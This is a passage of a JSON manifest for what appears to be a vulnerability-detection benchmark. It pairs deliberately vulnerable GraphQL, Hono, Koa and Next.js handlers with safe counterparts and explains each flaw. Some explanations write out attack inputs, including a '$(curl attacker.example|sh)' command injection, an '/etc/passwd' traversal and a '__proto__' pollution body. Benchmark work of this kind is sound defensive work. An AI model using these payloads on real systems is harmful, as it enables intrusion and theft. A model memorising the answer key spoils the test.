+      "architecture": "Apollo Server 4 with graphql-js executable schemas: gql-tagged typeDefs per module, a resolvers object of Query/Mutation/type maps taking (parent, args, context) where context.viewer is the authenticated subject, Prisma for relational reads and the Mongo driver for the search collections",
+      "language": "javascript",
+      "file": "graphql/profile-resolvers.js",
+      "kind": "vulnerable",
+      "category": "mass_assignment",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /graphql",
+      "line": 59,
+      "lineRange": [
+        57,
+        60
+      ],
+      "runtimeVerifiable": true,
+      "why": "The self-service mutation spreads the whole UserFields input into prisma.user.update, and that input type is shared with the staff console, so it carries role, planTier and emailVerified; a caller can send updateProfile(input: {role: \"ADMIN\", planTier: \"ENTERPRISE\"}) and the fields are written to its own row with no further check."
+    },
+    {
+      "id": "graphql-account-settings-patch",
+      "family": "graphql",
+      "language": "javascript",
+      "file": "graphql/account-settings-resolvers.js",
+      "kind": "safe",
+      "pairedWith": "graphql-account-profile-patch",
+      "why": "The same shared input type reaches the resolver, but only the three fields listed in SELF_EDITABLE are copied into the update payload, so supportTier and isStaff are dropped before the write no matter what the client sends."
+    },
+    {
+      "id": "graphql-error-extensions-shape",
+      "family": "graphql",
+      "architecture": "Apollo Server 4 bootstrap: expressMiddleware over an executable schema, session loaded into context, formatError shaping the response body",
+      "language": "javascript",
+      "file": "graphql/graphql-server.js",
+      "kind": "vulnerable",
+      "category": "verbose_error_response",
+      "severityBand": [
+        "low",
+        "medium"
+      ],
+      "route": "POST /graphql",
+      "line": 33,
+      "lineRange": [
+        29,
+        37
+      ],
+      "runtimeVerifiable": true,
+      "why": "formatError unwraps the original resolver error and copies its stack, message, and the pg driver's detail and query fields into extensions, so any failing operation returns server file paths, the failing SQL and database error text to an unauthenticated client; the error is already logged server-side on the line above, so nothing but the attacker gains from returning it."
+    },
+    {
+      "id": "graphql-gateway-error-shape",
+      "family": "graphql",
+      "language": "javascript",
+      "file": "graphql/gateway-server.js",
+      "kind": "safe",
+      "pairedWith": "graphql-error-extensions-shape",
+      "why": "formatError logs the unwrapped cause with an incident id server-side and returns only the message for codes on the client-facing allowlist; anything else becomes a fixed generic message with INTERNAL_SERVER_ERROR and the incident id, so no stack, driver text or query reaches the response."
+    },
+    {
+      "id": "graphql-home-feed-paging",
+      "family": "graphql",
+      "architecture": "Apollo Server 4 with graphql-js executable schemas: gql-tagged typeDefs per module, a resolvers object of Query/Mutation/type maps taking (parent, args, context) where context.viewer is the authenticated subject, Prisma for relational reads and the Mongo driver for the search collections",
+      "language": "javascript",
+      "file": "graphql/activity-feed-resolvers.js",
+      "kind": "vulnerable",
+      "category": "unbounded_resource_consumption",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "POST /graphql",
+      "line": 51,
+      "lineRange": [
+        45,
+        71
+      ],
+      "runtimeVerifiable": true,
+      "why": "`first` is passed straight to Prisma's take with no ceiling, so activityFeed(first: 1000000) is one query for the whole workspace history, and Comment.replies returns [Comment!]! resolved by a fresh findMany per node, so a query alternating replies { replies { ... } } multiplies database round-trips with query depth. A static reading of this file is needs_review rather than confirmed: it cannot see whether the server that mounts these resolvers installs a depth or complexity limit, which is what would bound the nested expansion."
+    },
+    {
+      "id": "graphql-project-timeline-paging",
+      "family": "graphql",
+      "language": "javascript",
+      "file": "graphql/timeline-resolvers.js",
+      "kind": "safe",
+      "pairedWith": "graphql-home-feed-paging",
+      "why": "The page size is validated as a positive integer and clamped to MAX_PAGE_SIZE before it reaches take, every nested list resolver carries its own fixed take, and the reply type has no list field of its own, so recursion depth is bounded by the schema rather than by the client's query."
+    },
+    {
+      "id": "hono-document-detail-drawer",
+      "family": "hono",
+      "architecture": "Hono 4 route modules in TypeScript, mounted with app.use middleware for session handling, reading input through c.req.param/query/json, persisting through a Prisma client or a pg pool, and answering with c.json, c.html or a raw Response",
+      "language": "typescript",
+      "file": "hono/document-detail.ts",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /documents/:id",
+      "line": 41,
+      "lineRange": [
+        40,
+        50
+      ],
+      "runtimeVerifiable": true,
+      "why": "The detail handler resolves the document from the path parameter alone; requireSession proves the caller is signed in but the viewer's workspaceId never enters the query, so any authenticated user can read any workspace's document by id. The list handler two routes above shows the scoping that the detail route omits."
+    },
+    {
+      "id": "hono-report-detail-drawer",
+      "family": "hono",
+      "language": "typescript",
+      "file": "hono/report-detail.ts",
+      "kind": "safe",
+      "pairedWith": "hono-document-detail-drawer",
+      "why": "The same detail-drawer shape, but the lookup is a findFirst keyed on both the path id and the viewer's workspaceId, so a report belonging to another workspace comes back null and the handler answers 404."
+    },
+    {
+      "id": "hono-status-incident-filter",
+      "family": "hono",
+      "architecture": "Hono 4 route modules in TypeScript, mounted with app.use middleware for session handling, reading input through c.req.param/query/json, persisting through a Prisma client or a pg pool, and answering with c.json, c.html or a raw Response",
+      "language": "typescript",
+      "file": "hono/status-search.ts",
+      "kind": "vulnerable",
+      "category": "reflected_cross_site_scripting",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "GET /status/incidents",
+      "line": 65,
+      "lineRange": [
+        64,
+        70
+      ],
+      "runtimeVerifiable": true,
+      "why": "The q query parameter is interpolated straight into the heading markup and handed to c.html, which serves it as text/html; the file's own escapeHtml helper is applied to the database-sourced incident fields but not to the echoed search term, so a term containing a script tag executes on this public page."
+    },
+    {
+      "id": "hono-status-component-filter",
+      "family": "hono",
+      "language": "typescript",
+      "file": "hono/status-directory.ts",
+      "kind": "safe",
+      "pairedWith": "hono-status-incident-filter",
+      "why": "The same public page echoes its search term through c.html, but the term passes through escapeHtml first, so the reflected value can only ever land in the document as text."
+    },
+    {
+      "id": "hono-ticket-attachment-stream",
+      "family": "hono",
+      "architecture": "Hono 4 route modules in TypeScript, mounted with app.use middleware for session handling, reading input through c.req.param/query/json, persisting through a Prisma client or a pg pool, and answering with c.json, c.html or a raw Response",
+      "language": "typescript",
+      "file": "hono/attachment-download.ts",
+      "kind": "vulnerable",
+      "category": "path_traversal",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /tickets/:ticketId/attachments/:filename",
+      "line": 39,
+      "lineRange": [
+        39,
+        43
+      ],
+      "runtimeVerifiable": true,
+      "why": "The trailing route segment is a greedy {.+} parameter that is joined onto the storage root with no containment check, so a request for ../../../../etc/passwd (or its percent-encoded form, which c.req.param decodes) resolves outside the attachment volume and the file is read and returned. The ticket lookup above it is correctly workspace-scoped, so authorization is not the problem here."
+    },
+    {
+      "id": "hono-expense-receipt-stream",
+      "family": "hono",
+      "language": "typescript",
+      "file": "hono/receipt-download.ts",
+      "kind": "safe",
+      "pairedWith": "hono-ticket-attachment-stream",
+      "why": "The same greedy filename parameter and the same fs read, but the candidate path is resolved and then required to sit inside the resolved per-expense directory before anything is opened, so a dot-dot segment returns 404 instead of escaping the storage root."
+    },
+    {
+      "id": "hono-inbox-priority-filter",
+      "family": "hono",
+      "architecture": "Hono 4 route modules in TypeScript, mounted with app.use middleware for session handling, reading input through c.req.param/query/json, persisting through a Prisma client or a pg pool, and answering with c.json, c.html or a raw Response",
+      "language": "typescript",
+      "file": "hono/conversation-search.ts",
+      "kind": "vulnerable",
+      "category": "sql_injection",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /conversations/search",
+      "line": 48,
+      "lineRange": [
+        48,
+        61
+      ],
+      "runtimeVerifiable": true,
+      "why": "Every other filter is bound as a numbered placeholder, but the repeated priority query parameters are wrapped in single quotes and spliced into the IN list, so a value containing a quote closes the literal and appends attacker-chosen SQL to the statement pool.query executes."
+    },
+    {
+      "id": "hono-contact-stage-filter",
+      "family": "hono",
+      "language": "typescript",
+      "file": "hono/contact-search.ts",
+      "kind": "safe",
+      "pairedWith": "hono-inbox-priority-filter",
+      "why": "The identical multi-value filter is bound as one array placeholder matched with = ANY($n::text[]), and the only interpolated fragments are the sort column resolved through a fixed map and a two-way direction ternary, so no request text reaches the statement text."
+    },
+    {
+      "id": "hono-idp-callback-landing",
+      "family": "hono",
+      "architecture": "Hono 4 route modules in TypeScript, mounted with app.use middleware for session handling, reading input through c.req.param/query/json, persisting through a Prisma client or a pg pool, and answering with c.json, c.html or a raw Response",
+      "language": "typescript",
+      "file": "hono/session-callback.ts",
+      "kind": "vulnerable",
+      "category": "open_redirect",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "GET /auth/callback",
+      "line": 45,
+      "lineRange": [
+        19,
+        45
+      ],
+      "runtimeVerifiable": true,
+      "why": "The next query parameter is passed to c.redirect without any check that it points inside this application, so a crafted sign-in link sends the browser to an attacker's host immediately after a successful authentication — the most credible possible moment to present a fake password prompt."
+    },
+    {
+      "id": "hono-magic-link-landing",
+      "family": "hono",
+      "language": "typescript",
+      "file": "hono/signin-return.ts",
+      "kind": "safe",
+      "pairedWith": "hono-idp-callback-landing",
+      "why": "The same post-sign-in redirect, but the requested landing page is resolved against the app origin and discarded unless the resulting origin matches it, so protocol-relative and absolute external targets fall back to /inbox and only a local path and query survive."
+    },
+    {
+      "id": "hono-embedded-widget-origins",
+      "family": "hono",
+      "architecture": "Hono 4 route modules in TypeScript, mounted with app.use middleware for session handling, reading input through c.req.param/query/json, persisting through a Prisma client or a pg pool, and answering with c.json, c.html or a raw Response",
+      "language": "typescript",
+      "file": "hono/embed-api.ts",
+      "kind": "vulnerable",
+      "category": "insecure_cors_configuration",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "GET /embed/conversations",
+      "line": 16,
+      "lineRange": [
+        13,
+        22
+      ],
+      "runtimeVerifiable": true,
+      "why": "The cors middleware echoes whatever Origin the request carried while also setting credentials: true, so any web page can make cookie-bearing requests to every /embed/* route and read the response, turning the session-scoped conversation list into cross-origin readable data. The misconfiguration sits on the mount and applies to every route beneath it; the route recorded here is the first one it exposes."
+    },
+    {
+      "id": "hono-status-widget-origins",
+      "family": "hono",
+      "language": "typescript",
+      "file": "hono/widget-api.ts",
+      "kind": "safe",
+      "pairedWith": "hono-embedded-widget-origins",
+      "why": "The same credentialed cors middleware on the same kind of mount, but the origin callback returns the request origin only when it is a member of a fixed allowlist and otherwise returns null, so an unknown origin receives no CORS headers at all."
+    },
+    {
+      "id": "koa-dashboard-pdf-render",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/render-jobs.js",
+      "kind": "vulnerable",
+      "category": "command_injection",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /render-jobs",
+      "line": 47,
+      "lineRange": [
+        42,
+        49
+      ],
+      "runtimeVerifiable": true,
+      "why": "The request body's filename lands in the output path and then inside a template string passed to child_process.exec, which runs the whole line through /bin/sh; the surrounding double quotes do not stop command substitution, so a filename of $(curl attacker.example|sh) executes as the application user."
+    },
+    {
+      "id": "koa-dashboard-png-render",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/preview-jobs.js",
+      "kind": "safe",
+      "pairedWith": "koa-dashboard-pdf-render",
+      "why": "The same renderer invocation goes through execFile with a fixed argv array so no shell parses it, and the filename is rejected up front unless it matches a lowercase slug pattern."
+    },
+    {
+      "id": "koa-export-detail-panel",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/export-detail.js",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /exports/:exportId",
+      "line": 37,
+      "lineRange": [
+        34,
+        39
+      ],
+      "runtimeVerifiable": true,
+      "why": "The detail handler selects the export row on the path id alone, so any signed-in user can read another tenant's export metadata and, because the handler then signs a download URL for its storage key, fetch the exported data itself. The list handler above it filters on ctx.state.user.orgId, which is the clause the detail query is missing."
+    },
+    {
+      "id": "koa-statement-detail-panel",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/statement-detail.js",
+      "kind": "safe",
+      "pairedWith": "koa-export-detail-panel",
+      "why": "The same detail panel and the same signed download URL, but the row is selected with both the path id and ctx.state.user.orgId in the WHERE clause, so another tenant's statement yields no row and the handler throws 404."
+    },
+    {
+      "id": "koa-accounting-connection-sync",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/invoice-sync.js",
+      "kind": "vulnerable",
+      "category": "verbose_error_response",
+      "severityBand": [
+        "low",
+        "medium"
+      ],
+      "route": "POST /connections/:connectionId/sync",
+      "line": 50,
+      "lineRange": [
+        46,
+        56
+      ],
+      "runtimeVerifiable": true,
+      "why": "The catch block copies the exception's message, stack trace, failing SQL statement and the upstream provider's raw response body into the response, handing any caller who can make the sync fail the server's file paths, module layout, database schema and third-party payloads."
+    },
+    {
+      "id": "koa-ledger-connection-sync",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/ledger-sync.js",
+      "kind": "safe",
+      "pairedWith": "koa-accounting-connection-sync",
+      "why": "The same failure path logs the exception, the provider status and the provider body server-side against a generated incident id, and the response carries only a fixed sentence and that id, so nothing about the internals crosses the boundary."
+    },
+    {
+      "id": "koa-ticket-attachment-store",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/attachment-upload.js",
+      "kind": "vulnerable",
+      "category": "unrestricted_file_upload",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /tickets/:ticketId/attachments",
+      "line": 47,
+      "lineRange": [
+        44,
+        48
+      ],
+      "runtimeVerifiable": true,
+      "why": "Nothing checks the content type or the extension: the uploaded file keeps the caller's own filename and extension and is copied into a directory nginx serves directly, so an upload named payload.php or note.html is fetched back from /uploads and executed or rendered in the site's origin."
+    },
+    {
+      "id": "koa-profile-avatar-store",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/avatar-upload.js",
+      "kind": "safe",
+      "pairedWith": "koa-ticket-attachment-store",
+      "why": "The same multipart upload, but the declared content type must be one of three image types, the file's own magic bytes must agree with it, the size is capped, the stored name is a UUID with the extension taken from the allowlist rather than from the caller, and the destination is outside any web-served directory."
+    },
+    {
+      "id": "koa-notification-toggle-patch",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/notification-preferences.js",
+      "kind": "vulnerable",
+      "category": "prototype_pollution",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "PATCH /notification-preferences",
+      "line": 29,
+      "lineRange": [
+        22,
+        31
+      ],
+      "runtimeVerifiable": true,
+      "why": "The recursive merge walks every key of the parsed request body without excluding __proto__ or constructor, so a body of {\"__proto__\":{\"isAdmin\":true}} recurses into Object.prototype and assigns onto it, adding that property to every object in the process for the rest of its lifetime."
+    },
+    {
+      "id": "koa-appearance-toggle-patch",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/display-preferences.js",
+      "kind": "safe",
+      "pairedWith": "koa-notification-toggle-patch",
+      "why": "The same recursive merge over the same request body, but keys named __proto__, constructor or prototype are skipped and only own properties are copied, so the walk can never reach a prototype object."
+    },
+    {
+      "id": "koa-team-member-role-change",
+      "family": "koa",
+      "architecture": "Koa 2 applications in CommonJS JavaScript with @koa/router routers mounted under a prefix, per-route requireUser middleware and composed async middleware using await next(), reading ctx.params/ctx.query/ctx.request.body, a pg pool for persistence, and ctx.body / ctx.throw for responses",
+      "language": "javascript",
+      "file": "koa/team-roles.js",
+      "kind": "vulnerable",
+      "category": "broken_function_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "PUT /teams/:teamId/members/:userId/role",
+      "line": 57,
+      "lineRange": [
+        49,
+        63
+      ],
+      "runtimeVerifiable": true,
+      "why": "requireUser proves a session and loadTeam proves the caller belongs to the team, but the caller's own role — which loadTeam has already put on ctx.state.team — is never compared against anything before the role is written, so any ordinary member can promote themselves or anyone else to owner."
+    },
+    {
+      "id": "koa-project-collaborator-role-change",
+      "family": "koa",
+      "language": "javascript",
+      "file": "koa/project-access.js",
+      "kind": "safe",
+      "pairedWith": "koa-team-member-role-change",
+      "why": "The same membership-loading middleware and the same role update, but the handler throws 403 unless the caller's own assignment on that project is lead, so membership alone does not confer the ability to change roles."
+    },
+    {
+      "id": "nextjs-app-router-invoice-detail",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router route handler with a cookie session and a Drizzle relational query",
+      "language": "typescript",
+      "file": "nextjs-app-router/invoice-detail-route.ts",
+      "scanAs": "app/api/invoices/[id]/route.ts",
+      "kind": "vulnerable",
+      "category": "broken_object_level_authorization",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /api/invoices/:id",
+      "line": 33,
+      "lineRange": [
+        32,
+        38
+      ],
+      "runtimeVerifiable": true,
+      "why": "The handler authenticates the caller but then resolves the invoice from the path parameter alone; session.organizationId is never part of the where clause, so any signed-in user can read another tenant's invoice, customer VAT details and internal notes by changing the id."
+    },
+    {
+      "id": "nextjs-app-router-billing-invoice-detail",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/billing-invoice-detail-route.ts",
+      "scanAs": "app/api/billing/invoices/[id]/route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-invoice-detail",
+      "why": "The same lookup carries the authenticated organization in the where clause, so a row belonging to another tenant is simply not returned and the handler answers 404 rather than leaking existence through a 403."
+    },
+    {
+      "id": "nextjs-app-router-search-preview",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router route handler returning an HTML fragment for a progressive-enhancement search box",
+      "language": "typescript",
+      "file": "nextjs-app-router/search-preview-route.ts",
+      "scanAs": "app/api/search/preview/route.ts",
+      "kind": "vulnerable",
+      "category": "reflected_cross_site_scripting",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "GET /api/search/preview",
+      "line": 36,
+      "lineRange": [
+        34,
+        41
+      ],
+      "runtimeVerifiable": true,
+      "why": "The q search parameter is interpolated straight into a markup string that is returned with a text/html content type, so a crafted q value executes script in the origin of the application; the catalog titles are interpolated unescaped on the same path."
+    },
+    {
+      "id": "nextjs-app-router-search-summary",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/search-summary-route.ts",
+      "scanAs": "app/api/search/summary/route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-search-preview",
+      "why": "The fragment is assembled the same way, but every interpolated value passes through escapeHtml (and encodeURIComponent inside the href), so no attacker-controlled text can close a tag or introduce an attribute."
+    },
+    {
+      "id": "nextjs-app-router-listing-thread",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router async server component rendering stored rich text from Drizzle",
+      "language": "typescript",
+      "file": "nextjs-app-router/listing-detail-page.tsx",
+      "scanAs": "app/listings/[slug]/page.tsx",
+      "kind": "vulnerable",
+      "category": "stored_cross_site_scripting",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /listings/:slug",
+      "line": 57,
+      "lineRange": [
+        28,
+        57
+      ],
+      "runtimeVerifiable": true,
+      "why": "Comment bodies are read out of the database and handed to dangerouslySetInnerHTML with no sanitisation, so markup stored by any user who can post a question runs for every visitor of the listing page."
+    },
+    {
+      "id": "nextjs-app-router-profile-endorsements",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/profile-detail-page.tsx",
+      "scanAs": "app/profiles/[handle]/page.tsx",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-listing-thread",
+      "why": "The component also renders stored rich text through dangerouslySetInnerHTML, but every value is passed through sanitize-html with a fixed tag, attribute and scheme allowlist immediately before it reaches the DOM, so no script, event handler or javascript: URL survives."
+    },
+    {
+      "id": "nextjs-app-router-link-preview",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router route handler performing a server-side fetch on behalf of the caller",
+      "language": "typescript",
+      "file": "nextjs-app-router/link-preview-route.ts",
+      "scanAs": "app/api/link-preview/route.ts",
+      "kind": "vulnerable",
+      "category": "server_side_request_forgery",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /api/link-preview",
+      "line": 34,
+      "lineRange": [
+        29,
+        41
+      ],
+      "runtimeVerifiable": true,
+      "why": "The URL from the request body is only checked for parseability before the server fetches it and returns the response body, so a caller can reach internal hosts, link-local metadata endpoints and non-http schemes, and read the result back through the preview fields."
+    },
+    {
+      "id": "nextjs-app-router-feed-import",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/feed-import-route.ts",
+      "scanAs": "app/api/integrations/feed-import/route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-link-preview",
+      "why": "The same outbound fetch is constrained to an https scheme and a fixed set of storefront hostnames before the request is made, and redirects are refused, so the caller cannot steer the request at an internal address."
+    },
+    {
+      "id": "nextjs-app-router-team-members",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router route handler with several exported methods sharing one file",
+      "language": "typescript",
+      "file": "nextjs-app-router/team-members-route.ts",
+      "scanAs": "app/api/teams/[teamId]/members/route.ts",
+      "kind": "vulnerable",
+      "category": "missing_authentication",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /api/teams/:teamId/members",
+      "line": 39,
+      "lineRange": [
+        39,
+        60
+      ],
+      "runtimeVerifiable": true,
+      "why": "GET in the same file resolves a session before reading the roster, but POST never looks at the session cookie: an anonymous request can upsert a membership for any teamId and grant itself the admin role."
+    },
+    {
+      "id": "nextjs-app-router-team-invites",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/team-invites-route.ts",
+      "scanAs": "app/api/teams/[teamId]/invites/route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-team-members",
+      "why": "Both exported methods resolve the session cookie and return 401 without one, and the mutating method additionally requires the session's team to match the path parameter before it writes."
+    },
+    {
+      "id": "nextjs-app-router-billing-portal",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router route handler constructing a billing API client at module scope",
+      "language": "typescript",
+      "file": "nextjs-app-router/billing-portal-route.ts",
+      "scanAs": "app/api/billing/portal/route.ts",
+      "kind": "vulnerable",
+      "category": "hardcoded_secret",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "POST /api/billing/portal",
+      "line": 10,
+      "lineRange": [
+        10,
+        13
+      ],
+      "runtimeVerifiable": false,
+      "why": "A 48-character high-entropy billing API secret is committed as a string literal and used to construct the payments client. Anyone with repository or build-artifact access inherits it, and rotating it is the only remedy because publication is not reversible. The value is synthetic; a provider-shaped literal was avoided deliberately so the corpus does not trip every downstream secret scanner."
+    },
+    {
+      "id": "nextjs-app-router-subscription-checkout",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/subscription-checkout-route.ts",
+      "scanAs": "app/api/billing/checkout/route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-billing-portal",
+      "why": "The only key-shaped literals are Stripe price identifiers, which are not credentials; the secret key is read from the environment and the client throws when it is missing rather than falling back to an embedded value."
+    },
+    {
+      "id": "nextjs-app-router-runtime-status",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router route handler under app/api/internal serving an operational dashboard",
+      "language": "typescript",
+      "file": "nextjs-app-router/runtime-status-route.ts",
+      "scanAs": "app/api/internal/runtime-status/route.ts",
+      "kind": "vulnerable",
+      "category": "debug_endpoint_exposure",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /api/internal/runtime-status",
+      "line": 11,
+      "lineRange": [
+        11,
+        38
+      ],
+      "runtimeVerifiable": true,
+      "why": "The handler has no authorization at all, yet it returns the database connection string, the Redis URL, live pg_stat_activity counts, migration state and the Stripe and Resend keys; the app/api/internal prefix is a naming convention, not an access control."
+    },
+    {
+      "id": "nextjs-app-router-service-health",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/service-health-route.ts",
+      "scanAs": "app/api/internal/service-health/route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-runtime-status",
+      "why": "The same diagnostics endpoint requires a session with the operator role and answers 404 otherwise, and it reports only hostnames and configured/not-configured booleans instead of connection strings and API keys."
+    },
+    {
+      "id": "nextjs-app-router-session-exchange",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router OAuth callback handler issuing the session cookie",
+      "language": "typescript",
+      "file": "nextjs-app-router/session-exchange-route.ts",
+      "scanAs": "app/api/auth/callback/route.ts",
+      "kind": "vulnerable",
+      "category": "open_redirect",
+      "severityBand": [
+        "medium",
+        "high"
+      ],
+      "route": "GET /api/auth/callback",
+      "line": 35,
+      "lineRange": [
+        13,
+        35
+      ],
+      "runtimeVerifiable": true,
+      "why": "The next parameter is passed to new URL() as the relative part, but an absolute or protocol-relative value overrides the base, so the post-login redirect can be pointed at an attacker's host — a credible phishing step because it happens immediately after a successful sign-in."
+    },
+    {
+      "id": "nextjs-app-router-login-complete",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/login-complete-route.ts",
+      "scanAs": "app/api/auth/complete/route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-session-exchange",
+      "why": "The return path must be a single-slash absolute path with no scheme or backslash before it is used, and anything else falls back to the dashboard, so the redirect target can never leave the application's own origin."
+    },
+    {
+      "id": "nextjs-app-router-document-export",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router route handler streaming a generated export off local disk",
+      "language": "typescript",
+      "file": "nextjs-app-router/document-export-route.ts",
+      "scanAs": "app/api/documents/export/route.ts",
+      "kind": "vulnerable",
+      "category": "path_traversal",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /api/documents/export",
+      "line": 30,
+      "lineRange": [
+        25,
+        41
+      ],
+      "runtimeVerifiable": true,
+      "why": "The name search parameter is joined onto the export root with no normalisation or containment check, so ../ segments walk out of the tenant directory and the file contents are returned to the caller."
+    },
+    {
+      "id": "nextjs-app-router-report-download",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/report-download-route.ts",
+      "scanAs": "app/api/reports/download/route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-document-export",
+      "why": "The caller supplies an export id, the file name comes from a row scoped to the caller's organization, it is reduced with path.basename, and the resolved path is verified to sit under the tenant directory before anything is read."
+    },
+    {
+      "id": "nextjs-app-router-ledger-export",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router route handler issuing a raw SQL statement through Drizzle",
+      "language": "typescript",
+      "file": "nextjs-app-router/ledger-export-route.ts",
+      "scanAs": "app/api/ledger/export/route.ts",
+      "kind": "vulnerable",
+      "category": "sql_injection",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "route": "GET /api/ledger/export",
+      "line": 30,
+      "lineRange": [
+        26,
+        33
+      ],
+      "runtimeVerifiable": true,
+      "why": "sql.raw receives a template string with the account search parameter pasted inside quotes and the sort parameter pasted into the order by clause, so a quote in account ends the literal and the rest of the statement is attacker-controlled."
+    },
+    {
+      "id": "nextjs-app-router-ledger-summary",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/ledger-summary-route.ts",
+      "scanAs": "app/api/ledger/summary/route.ts",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-ledger-export",
+      "why": "The statement uses Drizzle's sql template so the organization, account and limit values are bound as parameters, and the order by column and direction come from fixed SQL fragments chosen by an allowlist lookup that rejects anything unknown."
+    },
+    {
+      "id": "nextjs-app-router-metrics-uploader",
+      "family": "nextjs-app-router",
+      "architecture": "Next.js 15/16 App Router client component uploading directly to a third-party warehouse API",
+      "language": "typescript",
+      "file": "nextjs-app-router/metrics-uploader.tsx",
+      "scanAs": "app/(dashboard)/analytics/metrics-uploader.tsx",
+      "kind": "vulnerable",
+      "category": "secret_exposed_to_client_bundle",
+      "severityBand": [
+        "high",
+        "critical"
+      ],
+      "line": 6,
+      "lineRange": [
+        6,
+        25
+      ],
+      "runtimeVerifiable": true,
+      "why": "A warehouse service credential is read from a NEXT_PUBLIC_ variable inside a \"use client\" module, so Next.js inlines the literal value into the JavaScript chunk served to every visitor, who can then call the ingest API directly with full service scope."
+    },
+    {
+      "id": "nextjs-app-router-metrics-upload-panel",
+      "family": "nextjs-app-router",
+      "language": "typescript",
+      "file": "nextjs-app-router/metrics-upload-panel.tsx",
+      "scanAs": "app/(dashboard)/datasets/[id]/upload-panel.tsx",
+      "kind": "safe",
+      "pairedWith": "nextjs-app-router-metrics-uploader",
+      "why": "The service key is read only in a server component, where it never reaches the bundle, and the client child receives a short-lived token minted for one dataset and the ingest:append scope instead of the credential itself."
+    },
+    {
